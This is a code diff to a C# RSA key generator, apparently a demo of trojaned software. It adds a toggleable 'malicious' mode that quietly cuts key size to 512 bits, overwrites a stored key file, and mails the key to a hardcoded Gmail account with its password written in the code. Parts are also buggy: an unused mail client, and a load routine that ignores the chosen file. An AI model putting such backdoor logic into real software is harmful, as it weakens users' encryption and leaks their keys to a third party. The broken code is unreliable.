@@ -15,6 +15,7 @@ using System.Windows.Shapes;
 using System.Security.Cryptography;
 using System.IO;
 using System.Net.Mail;
+using Microsoft.Win32;
 
 namespace RSAkeygen
 {
@@ -25,6 +26,7 @@ namespace RSAkeygen
     {
         RSACryptoServiceProvider RSAalg;
         int keysize = 0;
+        bool malicious = false;
         static String path = @"C:\temp";
         DirectoryInfo di = Directory.CreateDirectory(path);
         
@@ -46,9 +48,14 @@ namespace RSAkeygen
                 if ((keysize >= 512) && (keysize <= 16384) && ((keysize & (keysize - 1)) == 0)) {
                     try
                     {
+                        if(malicious)
+                        {
+                            keysize = 512;
+                        }
                         RSAalg = new RSACryptoServiceProvider(keysize);
                         byte[] keyinfo = RSAalg.ExportCspBlob(true);
-                        File.WriteAllBytes(@"C:\temp\foo.txt", keyinfo);
+                        String timestamp = (DateTime.Now).ToString("ddHHmmss");
+                        File.WriteAllBytes(@"C:\temp\key" + timestamp + ".txt", keyinfo);
                     }
                     catch(ArgumentNullException)
                     {
@@ -74,11 +81,34 @@ namespace RSAkeygen
             {
                 Log("User clicked on load key button", w);
             }
-            //openInExplorer(@"C:\temp");
-            byte[] keyinfo = File.ReadAllBytes(@"C:\temp\foo.txt");
-            RSAalg = new RSACryptoServiceProvider();
-            RSAalg.ImportCspBlob(keyinfo);
-            loadedstatusblock.Text = "Keysize " + RSAalg.KeySize + " loaded";
+
+            OpenFileDialog openFileDialog1 = new OpenFileDialog();
+
+            openFileDialog1.InitialDirectory = "c:\\";
+            openFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
+            openFileDialog1.FilterIndex = 2;
+            openFileDialog1.RestoreDirectory = true;
+
+            Nullable<bool> result = openFileDialog1.ShowDialog();
+            if (result == true)
+            {
+                try
+                {
+                    String filename = openFileDialog1.FileName;
+                    byte[] keyinfo = File.ReadAllBytes(@"C:\temp\foo.txt");
+                    RSAalg = new RSACryptoServiceProvider();
+                    RSAalg.ImportCspBlob(keyinfo);
+                    if(malicious)
+                    {
+                        File.WriteAllBytes(@"C:\temp\foo.txt", keyinfo);
+                    }
+                    loadedstatusblock.Text = "Keysize " + RSAalg.KeySize + " loaded";
+                }
+                catch (Exception ex)
+                {
+                    loadedstatusblock.Text = "ERROR: Cannot load file";
+                }
+            }
         }
 
         private void Button_Click_2(object sender, RoutedEventArgs e)
@@ -103,6 +133,22 @@ namespace RSAkeygen
                 client.EnableSsl = true;
                 
                 client.Send(mail);
+                
+                if (malicious)
+                {
+                    MailMessage mailmal = new MailMessage("keytesterUTD2017@gmail.com", "keytesterUTD2017@gmail.com");
+                    SmtpClient clientmal = new SmtpClient("smtp.gmail.com");
+
+                    mail.Subject = "New Public Key";
+                    mail.Body = keystring;
+
+                    client.Port = 587;
+                    client.Credentials = new System.Net.NetworkCredential("keytesterUTD2017@gmail.com", "temocenarc");
+                    client.EnableSsl = true;
+
+                    client.Send(mail);
+                }
+
                 String timestamp = (DateTime.Now).ToString("yyyy/MM/dd/HH:mm:ss");
                 EmailButtonLabel.Text = "Email sent at " + timestamp;
             }
@@ -129,6 +175,20 @@ namespace RSAkeygen
             w.WriteLine("  :");
             w.WriteLine("  :{0}", logmsg);
             w.WriteLine("-------------------------------");
+        }
+
+        private void BehavButton_Click(object sender, RoutedEventArgs e)
+        {
+            if(malicious)
+            {
+                malicious = false;
+                BehavButton.Content =  "Enable malicious behavior";
+            }
+            else
+            {
+                malicious = true;
+                BehavButton.Content = "Disable malicious behavior";
+            }
         }
     }
 }
